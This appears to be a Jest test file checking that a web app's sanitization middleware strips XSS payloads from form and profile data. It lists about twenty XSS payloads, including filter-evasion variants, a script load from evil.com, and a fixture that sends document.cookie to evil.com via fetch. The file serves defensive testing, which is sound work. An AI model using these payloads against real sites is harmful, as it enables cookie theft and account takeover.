/**
 * XSS Protection Tests
 * Verifies that the sanitization middleware protects against XSS attacks
 * Q-Collector Security Audit - Sprint 1, Task 1.1
 */

const { sanitizeValue, sanitizeBody } = require('../../middleware/sanitization.middleware');

describe('XSS Protection - Sanitization Middleware', () => {
  describe('sanitizeValue()', () => {
    it('should remove script tags from strings', () => {
      const input = '<script>alert("XSS")</script>';
      const result = sanitizeValue(input);

      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
      expect(result).toBe('');
    });

    it('should remove img onerror attributes', () => {
      const input = '<img src=x onerror="alert(\'XSS\')">';
      const result = sanitizeValue(input);

      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('should remove javascript: protocol from links', () => {
      const input = '<a href="javascript:alert(\'XSS\')">Click me</a>';
      const result = sanitizeValue(input);

      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('alert');
    });

    it('should allow safe HTML tags', () => {
      const input = '<b>Bold</b> <i>Italic</i> <p>Paragraph</p>';
      const result = sanitizeValue(input);

      expect(result).toContain('<b>');
      expect(result).toContain('<i>');
      expect(result).toContain('<p>');
      expect(result).toContain('Bold');
      expect(result).toContain('Italic');
    });

    it('should sanitize nested objects', () => {
      const input = {
        name: '<script>alert("XSS")</script>John',
        description: '<b>Safe</b> <script>alert("XSS")</script>',
        metadata: {
          comment: '<img src=x onerror="alert(\'XSS\')">'
        }
      };

      const result = sanitizeValue(input);

      expect(result.name).not.toContain('<script>');
      expect(result.name).toContain('John');
      expect(result.description).toContain('<b>');
      expect(result.description).not.toContain('<script>');
      expect(result.metadata.comment).not.toContain('onerror');
    });

    it('should sanitize arrays', () => {
      const input = [
        '<script>alert("XSS")</script>',
        '<b>Safe</b>',
        '<img src=x onerror="alert(\'XSS\')">'
      ];

      const result = sanitizeValue(input);

      expect(result[0]).not.toContain('<script>');
      expect(result[1]).toContain('<b>');
      expect(result[2]).not.toContain('onerror');
    });

    it('should handle Thai text safely', () => {
      const input = '<b>สวัสดี</b> <script>alert("XSS")</script>';
      const result = sanitizeValue(input);

      expect(result).toContain('สวัสดี');
      expect(result).toContain('<b>');
      expect(result).not.toContain('<script>');
    });

    it('should remove HTML entities in strict mode', () => {
      const strictOptions = {
        allowedTags: [],
        allowedAttributes: {},
        textFilter: (text) => text.replace(/&[^;]+;/g, '')
      };

      const input = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const result = sanitizeValue(input, strictOptions);

      expect(result).not.toContain('&lt;');
      expect(result).not.toContain('&gt;');
    });
  });

  describe('sanitizeBody() middleware', () => {
    it('should sanitize request body', () => {
      const req = {
        body: {
          title: '<script>alert("XSS")</script>Test',
          description: '<b>Safe</b> <script>alert("XSS")</script>'
        }
      };

      const res = {};
      const next = jest.fn();

      const middleware = sanitizeBody();
      middleware(req, res, next);

      expect(req.body.title).not.toContain('<script>');
      expect(req.body.title).toContain('Test');
      expect(req.body.description).toContain('<b>');
      expect(req.body.description).not.toContain('<script>');
      expect(req.sanitized.body).toBe(true);
      expect(next).toHaveBeenCalled();
    });

    it('should handle empty body', () => {
      const req = { body: {} };
      const res = {};
      const next = jest.fn();

      const middleware = sanitizeBody();
      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it('should preserve non-string values', () => {
      const req = {
        body: {
          age: 25,
          active: true,
          data: null,
          tags: ['<script>XSS</script>', 'safe']
        }
      };

      const res = {};
      const next = jest.fn();

      const middleware = sanitizeBody();
      middleware(req, res, next);

      expect(req.body.age).toBe(25);
      expect(req.body.active).toBe(true);
      expect(req.body.data).toBe(null);
      expect(req.body.tags[0]).not.toContain('<script>');
      expect(req.body.tags[1]).toBe('safe');
    });
  });

  describe('XSS Attack Vectors', () => {
    const commonXSSPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="alert(\'XSS\')">',
      '<svg/onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>',
      '<div style="background:url(javascript:alert(\'XSS\'))">',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<IMG SRC="javascript:alert(\'XSS\')">',
      '<IMG SRC=javascript:alert("XSS")>',
      '<IMG SRC=JaVaScRiPt:alert("XSS")>',
      '<IMG SRC=`javascript:alert("XSS")`>',
      '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
      '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    ];

    commonXSSPayloads.forEach((payload, index) => {
      it(`should block XSS payload #${index + 1}: ${payload.substring(0, 50)}...`, () => {
        const result = sanitizeValue(payload);

        // Should not contain dangerous HTML tags
        expect(result).not.toContain('<script');
        expect(result).not.toContain('<iframe');
        expect(result).not.toMatch(/on\w+\s*=/i); // Event handlers

        // Should not execute scripts (no script tags remaining)
        expect(result).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/gi);

        // Note: Plain text like "alert(" is safe - it won't execute without HTML context
        // URL validation (javascript:) is handled separately by express-validator
      });
    });
  });

  describe('Real-world scenarios', () => {
    it('should protect form submission data', () => {
      const formData = {
        fieldData: {
          field_1: 'John Doe',
          field_2: '<b>Normal description</b>',
          field_3: '<script>alert("Stealing data")</script>Malicious content',
          field_4: '<img src=x onerror="fetch(\'https://evil.com/steal?data=\'+document.cookie)">'
        }
      };

      const sanitized = sanitizeValue(formData);

      expect(sanitized.fieldData.field_1).toBe('John Doe');
      expect(sanitized.fieldData.field_2).toContain('<b>');
      expect(sanitized.fieldData.field_3).not.toContain('<script>');
      expect(sanitized.fieldData.field_3).toContain('Malicious content');
      expect(sanitized.fieldData.field_4).not.toContain('onerror');
      expect(sanitized.fieldData.field_4).not.toContain('fetch');
    });

    it('should protect user profile updates', () => {
      const userData = {
        username: 'admin<script>alert("XSS")</script>',
        email: 'test@example.com',
        bio: '<p>I love coding!</p><script>alert("XSS")</script>',
        website: '<a href="javascript:alert(\'XSS\')">Click</a>'
      };

      const sanitized = sanitizeValue(userData);

      expect(sanitized.username).not.toContain('<script>');
      expect(sanitized.username).toContain('admin');
      expect(sanitized.email).toBe('test@example.com');
      expect(sanitized.bio).toContain('<p>');
      expect(sanitized.bio).not.toContain('<script>');
      // HTML sanitizer removes javascript: from href attributes
      expect(sanitized.website).not.toContain('javascript:');
    });

    it('should protect notification message content', () => {
      const notification = {
        message: 'New submission received! <script>alert("XSS")</script>',
        customTemplate: '<div>{{fieldName}}: <b>{{value}}</b></div><script>alert("XSS")</script>'
      };

      const sanitized = sanitizeValue(notification);

      expect(sanitized.message).not.toContain('<script>');
      expect(sanitized.message).toContain('New submission received!');
      expect(sanitized.customTemplate).toContain('<div>');
      expect(sanitized.customTemplate).toContain('<b>');
      expect(sanitized.customTemplate).not.toContain('<script>');
    });
  });
});
